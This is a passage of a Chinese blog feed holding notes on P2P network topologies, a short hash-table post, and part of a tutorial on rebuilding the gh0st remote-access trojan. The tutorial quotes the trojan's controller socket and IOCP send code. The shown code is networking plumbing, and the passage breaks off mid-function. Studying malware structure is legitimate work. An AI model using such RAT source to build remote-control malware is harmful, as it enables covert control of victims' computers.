可以定义为：网络的参与者共享它们所拥有的一部分资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其他对等节点（Peer）直接访问而无需经过中间实体。在此，网络中的参与者既是资源（服务和内容）提供者（Server），又是资源获取者（Client）。</p>\n<p>从计算模式上来说，P2P 打破了传统的 C/S 模型，在网络中的每个节点，其地位都是对等的。P2P 与 C/S 模型的对比如图 2-5 所示。图 2-5a 是典型的客户 / 服务器模型的交互形态，一个服务器面向多个客户提供服务，服务器集中管理资源，并负责资源的维护、共享等功能。图 2-5b 是典型的 P2P 模型的交互形态，每个节点既充当服务器，为其他节点提供服务，同时也享用其他节点提供的服务。</p>\n<p>P2P 模型具有以下特征：</p>\n<ul>\n<li>\n<p>非中心化。P2P 是全分布式系统，网络中的资源和服务分散在所有的节点上，信息的传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈。</p>\n</li>\n<li>\n<p>可扩展性。用户可以随时加入该网络，服务器的需求增加，系统的资源和服务能力也同步扩充。</p>\n</li>\n<li>\n<p>健壮性。P2P 架构天生具有耐攻击、高容错的优点。由于服务是分散在各个节点之间的，部分节点或网络遭到破坏对其他部分的影响很小。P2P 网络一般在部分节点失效时能够自动调整整体拓扑，保持其他节点的连通性。</p>\n</li>\n<li>\n<p>自治性。节点来自不同的所有者，不存在全局的控制者，节点可以随时加入或退出 P2P 系统。</p>\n</li>\n<li>\n<p>高性价比。性能优势是 P2P 被广泛关注的一个重要原因。采用 P2P 架构可以有效地利用互联网中散布的大量普通节点，将计算任务或存储资料分布到所有节点上。利用其中闲置的计算能力或存储空间，达到高性能计算和海量存储的目的。</p>\n</li>\n<li>\n<p>隐私保护。在 P2P 网络中，由于信息的传输分散在各节点之间，无需经过某个集中环节，用户的隐私信息被窃听和泄露的可能性大大缩小。</p>\n</li>\n<li>\n<p>负载均衡。P2P 网络环境下由于每个节点既是服务器又是客户，减少了传统 C/S 结构中对服务器计算能力、存储能力的要求，同时因为资源分布在多个节点上，更好地实现了整个网络的负载均衡。</p>\n</li>\n</ul>\n<p>P2P 和 C/S 模型的对比:</p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<h3 id=\"p2p网络的拓扑结构\"><a class=\"anchor\" href=\"#p2p网络的拓扑结构\">#</a> P2P 网络的拓扑结构</h3>\n<p>拓扑结构是指分布式系统中各个计算单元之间的物理或逻辑的互联关系，节点之间的拓扑结构一直是确定系统类型的重要依据。P2P 系统主要采用非集中式的拓扑结构，根据结构关系可以将 P2P 系统细分为四种拓扑形式。</p>\n<ol>\n<li>中心化拓扑（Centralized Topology）</li>\n</ol>\n<p>中心化拓扑的资源发现依赖中心化的目录系统，其优点是维护简单，资源发现效率高，缺点是与传统 C/S 结构类似，容易造成单点故障、访问的 “热点” 现象和版权纠纷等相关问题。这是第一代 P2P 网络采用的结构模式，经典案例是著名的 MP3 共享软件 Napster。该软件通过一个中央索引服务器保存所有 Napster 用户上传的音乐文件索引和存放位置的信息。当某个用户需要某个音乐文件时，首先连接到 Napster 中央索引服务器，在服务器上进行检索，服务器返回存有该文件的用户信息，再由请求者直接连接到文件的所有者传输文件。</p>\n<ol start=\"2\">\n<li>全分布式非结构化拓扑（Decentralized Unstructured Topology）</li>\n</ol>\n<p>全分布式非结构化拓扑在重叠网络（overlay network）上采用随机图的组织方式，节点度数服从 Power-law 规律（幂律法则），能够较快发现目的节点，面对网络的动态变化，体现了较好的容错能力，因此具有较好的可用性。采用这种拓扑结构最典型的案例是 Gnutella。Gnutella 没有中央索引服务器，是更加纯粹的 P2P 系统。每台机器在 Gnutella 网络中是真正的对等关系，既是客户又是服务器，被称为对等机（Servent，即 Server+Client 的组合）。当一台计算机要下载一个文件，它首先以文件名或者关键字生成一个查询，并把这个查询发送给与它相连的所有计算机，这些计算机上如果有这个文件，则与查询的机器建立连接，如果没有这个文件，则继续在自己相邻的计算机之间转发这个查询，直到找到文件为止。</p>\n<ol start=\"3\">\n<li>全分布式结构化拓扑（Decentralized Structured Topology）</li>\n</ol>\n<p>全分布式结构化拓扑主要采用分布式散列表（Distributed Hash Table，DHT）技术来组织网络中的节点。DHT 是一个由广域范围大量节点共同维护的巨大散列表。散列表被分割成不连续的块，每个节点分配一个属于自己的散列块，并成为这个散列块的管理者。通过加密散列函数，一个对象的名字或关键词被映射为 128 位或 160 位的散列值。DHT 类结构能够自适应节点的动态加入 / 退出，有着良好的可扩展性、鲁棒性、节点 ID 分配的均匀性和自组织能力。由于重叠网络采用了确定性拓扑结构，DHT 可以精确地发现节点。经典的案例是 Tapestry、Pastry、Chord 和 CAN。</p>\n<ol start=\"4\">\n<li>半分布式拓扑（Partially Decentralized Topology）</li>\n</ol>\n<p>半分布式拓扑吸取了中心化拓扑和全分布式非结构化拓扑的优点，选择性能较高（处理、存储、带宽等方面性能）的节点作为超级节点（supernode 或 hub），在各个超级节点上存储了系统中其他部分节点的信息，发现算法仅在超级节点之间转发，超级节点再将查询请求转发给适当的叶子节点。半分布式结构也是一个层次式结构，超级节点之间构成一个高速转发层，超级节点和所负责的普通节点构成若干层次。采用这种结构的最典型的案例就是 KaZaa。</p>\n<p>每种拓扑结构的 P2P 网络都有其优缺点，在实际应用中，需要从可扩展性、可靠性、可维护性、发现算法的效率、复杂查询等方面综合权衡，选择适合的拓扑结构来组织 P2P 应用的节点功能。</p>\n<h2 id=\"实验\"><a class=\"anchor\" href=\"#实验\">#</a> 实验</h2>\n<p>1. 结合 Wireshark 网络流量分析工具对网页邮件登录过程进行捕获和分析，说明其基本的工作流程。</p>\n<p>2. 结合 Wireshark 网络流量分析工具对迅雷登录和文件下载过程进行捕获和分析，说明其基本的工作流程。</p>\n",
            "tags": [
                "Windows网络编程",
                "协议层次和服务模型",
                "IP地址",
                "端口号",
                "DNS",
                "网络地址转换NAT",
                "分布式网络应用程序",
                "客户/服务器模型",
                "浏览器/服务器模型",
                "P2P模型"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/STL/STL-hash/",
            "url": "https://or0kit.github.io/Programming/STL/STL-hash/",
            "title": "STL-hash",
            "date_published": "2022-09-27T22:44:42.000Z",
            "content_html": "<h1 id=\"散列hash\"><a class=\"anchor\" href=\"#散列hash\">#</a> 散列（hash)</h1>\n<p>散列技术是一种查找技术，而且是一种 &quot;一步到位&quot; 的查找技术。用散列技术查找的时候，一开始存储元素就按照采用的散列函数 f 所对应的规律去存储元素，使得存进去的元素 <code>key</code>  的位置是 <code>f(key)</code> 。查找时直接通过函数 f 计算出要查找元素的位置 <code>index</code> 。散列技术既是一种查找技术也是一种存储技术。这里的函数 <code>f</code>  叫散列函数 (哈希函数), 采用散列技术所建立的元素存储空间就是散列表 (哈希表)，元素的存储位置就叫散列地址 (哈希地址)。</p>\n<p>优点：简化了比较过程，效率大大提高。</p>\n<p>缺点：</p>\n<p>1. 散列技术不适合集合中重复元素很多的情形，因为同样的 <code>key</code>  会对应很多 <code>index</code> ，比如用性别查找一个班的学生。<br />\n2. 散列技术不适合范围查找，也不适合查找最大值，最小值。<br />\n3. 散列函数需要很好的设计，应该保证简单、均匀、存储效率高。<br />\n4. 可能有不同的元素被映射到相同的位置 (即有相同的索引) 。因为元素个数大于 <code>array</code>  容量。这便是所谓的 “碰撞 (ollision)” 问题。解决碰撞问题的方法有许多种，包括线性探测 (linearprobing) 、二次探测 (quadratic probing) 、开链 (separate chaining) 等做法。每一种的效率各不相同 --- 与 <code>array</code>  的填满程度有关。</p>\n<p>散列函数应该满足什么样的特性呢？<br />\n 首先应该计算简单，避免每次查找时计算散列地址耗费太多时间<br />\n其次应该保证计算出来的哈希地址空间分布均匀，这样可以节省空间和为处理冲突而耗费的时间。</p>\n<p>关于散列冲突的处理有几种办法，比如线性探测法、二次探测法、随机探测法等。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MjcyNjgxL2FydGljbGUvZGV0YWlscy8xMjA4MTA5MzM=\">https://blog.csdn.net/qq_44272681/article/details/120810933</span></p>\n",
            "tags": [
                "哈希表"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%99%E8%BF%9C%E6%8E%A7-02%E5%8A%A0%E5%85%A5Socket%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9A%84%E5%86%85%E6%A0%B8/",
            "url": "https://or0kit.github.io/Programming/MFC/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%99%E8%BF%9C%E6%8E%A7-02%E5%8A%A0%E5%85%A5Socket%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%9A%84%E5%86%85%E6%A0%B8/",
            "title": "从零开始写远控-02加入Socket数据传输的内核",
            "date_published": "2022-06-16T12:41:32.000Z",
            "content_html": "<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>已经编写好基本的界面了，接下来分析 gh0st 的数据传输架构，这是一个远控的核心，其他功能都可以根据这个核心去拓展。</p>\n<h2 id=\"分析gh0st主控端socket内核\"><a class=\"anchor\" href=\"#分析gh0st主控端socket内核\">#</a> 分析 gh0st 主控端 socket 内核</h2>\n<p>简略分析 socket 的内核。</p>\n<p>视频中老狼是从重启功能开始切入分析的。</p>\n<p>开始从 ReBoot 函数开始看起：</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>当触发重启消息事件时，就会调用  <code>SendSelectCommand</code>  处理函数（很多都是调用这个函数，相当于一个消息处理的入口）。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CGh0stView</span><span class=\"token operator\">::</span><span class=\"token function\">SendSelectCommand</span><span class=\"token punctuation\">(</span>PBYTE pData<span class=\"token punctuation\">,</span> UINT nSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// TODO: Add your command handler code here</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tPOSITION pos <span class=\"token operator\">=</span> m_pListCtrl<span class=\"token operator\">-></span><span class=\"token function\">GetFirstSelectedItemPosition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//iterator for the CListCtrl</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">)</span> <span class=\"token comment\">//so long as we have a valid POSITION, we keep iterating</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">int</span>\tnItem <span class=\"token operator\">=</span> m_pListCtrl<span class=\"token operator\">-></span><span class=\"token function\">GetNextSelectedItem</span><span class=\"token punctuation\">(</span>pos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tClientContext<span class=\"token operator\">*</span> pContext <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>ClientContext<span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>m_pListCtrl<span class=\"token operator\">-></span><span class=\"token function\">GetItemData</span><span class=\"token punctuation\">(</span>nItem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token comment\">// 发送获得驱动器列表数据包</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tm_iocpServer<span class=\"token operator\">-></span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">,</span> pData<span class=\"token punctuation\">,</span> nSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token comment\">//Save the pointer to the new item in our CList</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">//EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt\t</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>解释上面的代码：获取选中了多少行，然后遍历每一行，获取每一行的  <code>ClientContext</code>  类对象，然后调用  <code>m_iocpServer</code>  的  <code>Send</code>  函数发送数据。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">ClientContext</span>          <span class=\"token comment\">// 简单分析 ClientContext 结构体然后回到  SendSelectCommand</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    SOCKET\t\t\t\tm_Socket<span class=\"token punctuation\">;</span>              <span class=\"token comment\">// 套接字</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Store buffers</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tCBuffer\t\t\t\tm_WriteBuffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tCBuffer\t\t\t\tm_CompressionBuffer<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 接收到的压缩的数据</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tCBuffer\t\t\t\tm_DeCompressionBuffer<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 解压后的数据</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tCBuffer\t\t\t\tm_ResendWriteBuffer<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 上次发送的数据包，接收失败时重发时用</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">int</span>\t\t\t\t\tm_Dialog<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 放对话框列表用，第一个 int 是类型，第二个是 CDialog 的地址</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">int</span>\t\t\t\t\tm_nTransferProgress<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">// Input Elements for Winsock</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tWSABUF\t\t\t\tm_wsaInBuffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\tBYTE\t\t\t\tm_byInBuffer<span class=\"token punctuation\">[</span><span class=\"token number\">8192</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">// Output elements for Winsock</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tWSABUF\t\t\t\tm_wsaOutBuffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tHANDLE\t\t\t\tm_hWriteComplete<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t<span class=\"token comment\">// Message counts... purely for example purposes</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tLONG\t\t\t\tm_nMsgIn<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tLONG\t\t\t\tm_nMsgOut<span class=\"token punctuation\">;</span>\t</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tBOOL\t\t\t\tm_bIsMainSocket<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 是不是主 socket</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\tClientContext<span class=\"token operator\">*</span>\t\tm_pWriteContext<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\tClientContext<span class=\"token operator\">*</span>\t\tm_pReadContext<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>接着按 F12 查看  <code>m_iocpServer</code>  声明。</p>\n<p>发现是  <code>CIOCPServer</code>  类型的指针变量：  <code>CIOCPServer* m_iocpServer</code></p>\n<h3 id=\"ciocpserver-类-send函数分析\"><a class=\"anchor\" href=\"#ciocpserver-类-send函数分析\">#</a> CIOCPServer 类 Send 函数分析</h3>\n<p>简单的了解一下流程。</p>\n<p>查看其  <code>Send</code>  函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token class-name\">CIOCPServer</span><span class=\"token operator\">::</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>ClientContext<span class=\"token operator\">*</span> pContext<span class=\"token punctuation\">,</span> LPBYTE lpData<span class=\"token punctuation\">,</span> UINT nSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pContext <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">try</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nSize <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token comment\">// Compress data</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>\tdestLen <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">double</span><span class=\"token punctuation\">)</span>nSize <span class=\"token operator\">*</span> <span class=\"token number\">1.001</span>  <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 计算压缩后数据的大小</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\tLPBYTE\t\t\tpDest <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> BYTE<span class=\"token punctuation\">[</span>destLen<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>                 <span class=\"token comment\">// 分配压缩数据的空间</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token keyword\">int</span>\tnRet <span class=\"token operator\">=</span> <span class=\"token function\">compress</span><span class=\"token punctuation\">(</span>pDest<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>destLen<span class=\"token punctuation\">,</span> lpData<span class=\"token punctuation\">,</span> nSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 压缩数据</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nRet <span class=\"token operator\">!=</span> Z_OK<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">delete</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> pDest<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\tLONG nBufLen <span class=\"token operator\">=</span> destLen <span class=\"token operator\">+</span> HDR_SIZE<span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 数据中加入数据头标识大小    </span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token comment\">// 5 bytes packet flag</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 写入数据头</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t<span class=\"token comment\">// 4 byte header [Size of Entire Packet]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PBYTE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>nBufLen<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>nBufLen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 写入当前数据总大小  </span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token comment\">// 4 byte header [Size of UnCompress Entire Packet]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PBYTE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span>nSize<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>nSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>          <span class=\"token comment\">// 写入压缩前的数据大小</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\t<span class=\"token comment\">// Write Data</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>pDest<span class=\"token punctuation\">,</span> destLen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// 写入数据</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token keyword\">delete</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> pDest<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t<span class=\"token comment\">// 发送完后，再备份数据，因为有可能是 m_ResendWriteBuffer 本身在发送，所以不直接写入</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\tLPBYTE lpResendWriteBuffer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> BYTE<span class=\"token punctuation\">[</span>nSize<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token function\">CopyMemory</span><span class=\"token punctuation\">(</span>lpResendWriteBuffer<span class=\"token punctuation\">,</span> lpData<span class=\"token punctuation\">,</span> nSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">ClearBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>lpResendWriteBuffer<span class=\"token punctuation\">,</span> nSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 备份发送的数据</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\t<span class=\"token keyword\">delete</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> lpResendWriteBuffer<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t<span class=\"token keyword\">else</span> <span class=\"token comment\">// 要求重发</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_WriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">ClearBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\tpContext<span class=\"token operator\">-></span>m_ResendWriteBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>m_bPacketFlag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 备份发送的数据\t</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t<span class=\"token comment\">// Wait for Data Ready signal to become available</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token function\">WaitForSingleObject</span><span class=\"token punctuation\">(</span>pContext<span class=\"token operator\">-></span>m_hWriteComplete<span class=\"token punctuation\">,</span> INFINITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token comment\">// Prepare Packet</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t <span class=\"token comment\">//\tpContext->m_wsaOutBuffer.buf = (CHAR*) new BYTE[nSize];</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t <span class=\"token comment\">//\tpContext->m_wsaOutBuffer.len = pContext->m_WriteBuffer.GetBufferLen();</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre> \t\tOVERLAPPEDPLUS <span class=\"token operator\">*</span> pOverlap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token function\">OVERLAPPEDPLUS</span><span class=\"token punctuation\">(</span>IOWrite<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 创建一个对列</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre> \t\t<span class=\"token function\">PostQueuedCompletionStatus</span><span class=\"token punctuation\">(</span>m_hCompletionPort<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span> pContext<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pOverlap<span class=\"token operator\">-></span>m_ol<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 